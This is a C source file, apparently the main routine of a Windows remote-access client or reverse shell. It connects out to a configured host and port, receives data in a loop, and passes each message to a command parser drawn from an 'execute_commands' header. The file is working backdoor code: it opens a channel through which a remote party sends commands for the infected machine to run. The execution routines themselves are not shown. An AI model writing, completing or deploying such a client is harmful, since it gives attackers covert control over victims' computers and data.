#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include "macros/macros.h"
#include <stdio.h>
#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <TlHelp32.h>
#include <io.h>
#include "headers/structs.h"
#include "headers/sockets.h"
#include "headers/execute_commands.h"
#include "headers/command_parser.h"

#pragma comment(lib, "Ws2_32.lib")

int main(void) {
   // Create and dial to server
    WSADATA Data;
    char ReceiveBuffer[RECEIVE_BUFFER_SIZE] = {0};
    SOCKET ClientSocket = INVALID_SOCKET;
    WORD OperationResultCode = 0;
    struct addrinfo *Ptr, *Result,Hint;

    OperationResultCode = WSAStartup(MAKEWORD(2,2),&Data);
    if(OperationResultCode != 0){
        // TODO!!
        return 1;
    }

    ZeroMemory(&Hint,sizeof(Hint));
    Hint.ai_family = AF_UNSPEC;
    Hint.ai_protocol = IPPROTO_TCP;
    Hint.ai_socktype = SOCK_STREAM;

    OperationResultCode = getaddrinfo(HOST_ADDRESS,HOST_PORT,&Hint,&Result);
    if(OperationResultCode != 0){
        // TODO!!
        return 1;
    }

    Ptr = Result;

    ClientSocket = socket(Ptr->ai_family,Ptr->ai_socktype,Ptr->ai_protocol);
    if(ClientSocket == INVALID_SOCKET){
        // TODO!!
        return 1;
    }

    OperationResultCode = connect(ClientSocket,Ptr->ai_addr,Ptr->ai_addrlen);
    if(OperationResultCode == SOCKET_ERROR){
        // TODO!!
        return 1;
    }

    while(recv(ClientSocket,ReceiveBuffer,RECEIVE_BUFFER_SIZE - 1,0) != SOCKET_ERROR){
        CommandParser(ReceiveBuffer,ClientSocket);
        ZeroMemory(ReceiveBuffer,RECEIVE_BUFFER_SIZE);
    }

}